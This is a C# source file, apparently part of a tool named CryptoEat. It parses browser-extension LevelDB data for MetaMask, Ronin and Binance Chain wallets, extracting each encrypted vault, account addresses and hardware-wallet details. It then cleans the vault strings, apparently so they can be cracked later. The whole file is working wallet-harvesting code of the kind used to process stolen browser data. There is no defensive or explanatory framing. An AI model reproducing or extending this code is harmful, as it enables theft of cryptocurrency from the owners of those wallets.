using System.Runtime.CompilerServices;
using System.Text.Json.Nodes;
using CryptoEat.Modules.Logs;
using LevelDB;

namespace CryptoEat.Modules.Wallet.Libs;

internal static class CryptoLib2
{
    private static bool TryGetMetamask(this DB ldb, out WalletInfo metamaskOut, out WalletType walletType)
    {
        walletType = WalletType.Metamask;
        metamaskOut = new WalletInfo();

        try
        {
            var data = ldb.Get("data");
            var jsonParsed = JsonNode.Parse(data)!;

            try
            {
                var identities = jsonParsed["PreferencesController"]?["identities"]!.AsObject()!;

                try
                {
                    metamaskOut.Accounts ??= new List<Account>();
                    foreach (var identity in identities)
                    {
                        var name = identity.Value?["name"]?.GetValue<string>();
                        var address = identity.Value?["address"]?.GetValue<string>();

                        string? hwWallet = null;
                        if (name != null)
                            if (name.Contains("Trezor"))
                            {
                                hwWallet = "Trezor";
                                var model = jsonParsed["AppStateController"]?["trezorModel"]?.GetValue<string?>();
                                if (model != null)
                                    hwWallet += " Model " + model;
                            }
                            else if (name.Contains("Ledger"))
                            {
                                hwWallet = "Ledger";
                            }

                        if (address != null)
                            metamaskOut.Accounts.Add(new Account(address, hwWallet));
                    }
                }
                catch
                {
                    // error handler
                }
            }
            catch
            {
                // error handler
            }

            var vault = jsonParsed["KeyringController"]?["vault"]?.ToString();

            if (vault != null)
            {
                metamaskOut.NormalizedVault = vault;
                return true;
            }
        }
        catch
        {
            // error handler
        }

        return false;
    }

    private static bool TryGetRonin(this DB ldb, out WalletInfo ronin, out WalletType walletType)
    {
        walletType = WalletType.Ronin;
        ronin = new WalletInfo();

        try
        {
            ronin.NormalizedVault = ldb.Get("encryptedVault");
            var account = JsonNode.Parse(ldb.Get("selectedAccount"))!;
            var address = account["address"]?.GetValue<string?>();
            if (string.IsNullOrEmpty(address))
                return false;

            string? hwWallet = null;
            if (account["type"]?.GetValue<string?>() != "Software") hwWallet = account["type"]?.GetValue<string?>();

            ronin.Accounts ??= new List<Account>();
            ronin.Accounts.Add(new Account(address, hwWallet));
            return true;
        }
        catch
        {
            // error handler
        }

        return false;
    }

    public static bool TryGetBinanceChain(this DB ldb, out WalletInfo binanceChain, out WalletType walletType)
    {
        walletType = WalletType.Binance;
        binanceChain = new WalletInfo();

        try
        {
            binanceChain.NormalizedVault = ldb.Get("vault");
            return true;
        }
        catch
        {
            // error handler
        }

        return false;
    }

    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    public static bool GetLdbWallet(this DB ldb, out WalletInfo wallet, out WalletType walletType)
    {
        return ldb.TryGetMetamask(out wallet, out walletType)
               || ldb.TryGetRonin(out wallet, out walletType)
               || ldb.TryGetBinanceChain(out wallet, out walletType);
    }
}

internal class WalletInfo
{
    private string _vault;
    public List<Account>? Accounts { get; set; }

    public string NormalizedVault
    {
        get => _vault;
        set
        {
            _vault = value.Replace("\\", "");
            while (_vault.StartsWith("\""))
                _vault = _vault[1..];
            while (_vault.EndsWith("\""))
                _vault = _vault[..^1];
        }
    }
}

internal class Account(string address, string? hardwareWallet = null)
{
    public string? HardwareWallet { get; set; } = hardwareWallet;
    public string Address { get; set; } = address;
}